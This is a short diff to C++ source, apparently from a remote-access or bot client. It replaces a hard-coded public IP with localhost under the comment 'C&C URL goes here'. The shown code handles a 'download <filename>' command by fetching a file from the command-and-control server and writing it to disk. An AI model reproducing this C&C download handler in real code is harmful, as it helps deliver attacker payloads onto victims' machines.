@@ -85,7 +85,7 @@ int main()
                     DWORD Length = 0;
                     //download <filename>
                     string filename = fullcmd.substr(strlen("download "));
-                    string FullURL = "http://54.247.53.160/gui/" + filename;
+                    string FullURL = "http://127.0.0.1/gui/" + filename; // C&C URL goes here.
                     char* FileData = DownloadFile(FullURL.c_str(), &Length, NULL);
                     FILE* f = fopen(filename.c_str(), "wb");
                     fwrite(FileData, 1, Length, f);
